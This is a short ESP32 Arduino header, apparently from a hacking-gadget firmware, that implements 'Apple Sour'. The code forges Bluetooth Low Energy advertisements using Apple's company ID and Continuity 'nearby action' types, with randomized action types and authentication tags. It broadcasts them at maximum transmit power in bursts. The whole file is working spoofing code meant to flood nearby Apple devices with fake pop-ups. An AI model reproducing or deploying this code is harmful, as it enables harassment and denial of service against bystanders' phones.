#pragma once

#include <Arduino.h>

#include <NimBLEDevice.h>

NimBLEAdvertising *pAdvertising;
NimBLEServer *pServer;

NimBLEAdvertisementData setup_apple_sour()
{
    NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();
    uint8_t *AdvData_Raw = nullptr;
    uint8_t i = 0;

    AdvData_Raw = new uint8_t[17];

    AdvData_Raw[i++] = 17 - 1; // Packet Length
    AdvData_Raw[i++] = 0xFF;   // Packet Type (Manufacturer Specific)
    AdvData_Raw[i++] = 0x4C;   // Packet Company ID (Apple, Inc.)
    AdvData_Raw[i++] = 0x00;   // ...
    AdvData_Raw[i++] = 0x0F;   // Type
    AdvData_Raw[i++] = 0x05;   // Length
    AdvData_Raw[i++] = 0xC1;   // Action Flags
    const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
    AdvData_Raw[i++] = types[rand() % sizeof(types)]; // Action Type
    esp_fill_random(&AdvData_Raw[i], 3);              // Authentication Tag
    i += 3;
    AdvData_Raw[i++] = 0x00; // ???
    AdvData_Raw[i++] = 0x00; // ???
    AdvData_Raw[i++] = 0x10; // Type ???
    esp_fill_random(&AdvData_Raw[i], 3);

    AdvData.addData(std::string((char *)AdvData_Raw, 17));

    delete[] AdvData_Raw;

    return AdvData;
}

class ServerCallbacks : public NimBLEServerCallbacks
{
};

void init_sour()
{
    NimBLEDevice::init("X_X");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9); /** +9db */
    pServer = NimBLEDevice::createServer();
    pServer->setCallbacks(new ServerCallbacks());
}

void do_apple_sour(BLEAdvertising *pAdvertising)
{
    debugln("starting Apple Sour!");

    pAdvertising = BLEDevice::getAdvertising();
    pAdvertising = pServer->getAdvertising();

    delay(40);
    // NimBLEAdvertisementData advertisementData = getOAdvertisementData();
    NimBLEAdvertisementData advertisementData = setup_apple_sour();
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    vTaskDelay(500);
    pAdvertising->stop();

    debugln("ending Apple Sour!");
}

void de_init_sour()
{
    NimBLEDevice::deinit(true);
}